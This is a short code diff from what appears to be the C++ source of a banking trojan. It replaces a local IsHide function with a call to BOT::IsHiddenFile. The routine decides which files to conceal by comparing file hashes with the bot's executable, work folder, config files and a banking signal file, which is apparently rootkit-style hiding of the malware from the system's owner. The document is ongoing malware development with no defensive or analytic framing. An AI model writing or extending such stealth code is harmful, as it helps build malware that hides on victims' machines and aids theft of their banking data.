@@ -266,21 +266,21 @@ WCHAR *GetTempName()
 
 //----------------------------------------------------------------------------
 
-BOOL IsHide( DWORD dwFileHash )
-{
-	if ( dwFileHash == BOT::GetBotExeNameHash() ||
-	     dwFileHash == BOT::GetWorkFolderHash() ||
-	     dwFileHash == BOT_CFGN_HASH ||
-		 dwFileHash == BOT_STAV_HASH ||
-		 dwFileHash == BOT_MNAV_HASH ||
-		 dwFileHash == BANKING_SIGNAL_FILE_HASH
-		 )
-	{
-		return TRUE;
-	}
-
-	return FALSE;
-}
+//BOOL IsHide( DWORD dwFileHash )
+//{
+//	if ( dwFileHash == BOT::GetBotExeNameHash() ||
+//	     dwFileHash == BOT::GetWorkFolderHash() ||
+//	     dwFileHash == BOT_CFGN_HASH ||
+//		 dwFileHash == BOT_STAV_HASH ||
+//		 dwFileHash == BOT_MNAV_HASH ||
+//		 dwFileHash == BANKING_SIGNAL_FILE_HASH
+//		 )
+//	{
+//		return TRUE;
+//	}
+//
+//	return FALSE;
+//}
 //----------------------------------------------------------------------------
 
 BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
@@ -303,7 +303,7 @@ BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
 //	pOutputDebugStringW(Str.t_str());
 
 	// Проверяем хэш
-	BOOL Hide = IsHide(Hash);
+	BOOL Hide = BOT::IsHiddenFile(Hash);
 
 	return Hide;
 }
